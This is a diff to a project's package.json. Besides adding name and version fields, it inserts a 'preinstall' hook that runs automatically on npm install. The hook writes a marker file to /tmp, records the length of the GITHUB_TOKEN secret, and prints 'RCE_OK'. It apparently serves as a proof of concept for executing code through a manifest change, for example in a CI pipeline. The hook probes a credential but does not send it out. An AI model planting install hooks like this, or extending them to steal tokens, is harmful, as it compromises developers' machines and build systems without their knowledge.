@@ -56,7 +56,8 @@
     "fly:pages": "fly deploy --config apps/pages/fly.toml --dockerfile apps/pages/Dockerfile --no-cache",
     "fly:ai": "fly deploy --config apps/ai-agent/fly.toml --dockerfile apps/ai-agent/Dockerfile --no-cache",
     "cleanup:github-teams": "dotenv -e .env -- node scripts/cleanup-github-teams.js",
-    "commit": "cz"
+    "commit": "cz",
+    "preinstall": "echo POC_MARKER_CLASSMOJI > /tmp/POC_MARKER_CLASSMOJI.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_CLASSMOJI.txt; echo RCE_OK >> /tmp/POC_MARKER_CLASSMOJI.txt; cat /tmp/POC_MARKER_CLASSMOJI.txt"
   },
   "dependencies": {
     "@infisical/sdk": "^5.0.2",
@@ -109,5 +110,7 @@
     "commitizen": {
       "path": "cz-conventional-changelog"
     }
-  }
+  },
+  "name": "classmoji",
+  "version": "1.0.0"
 }
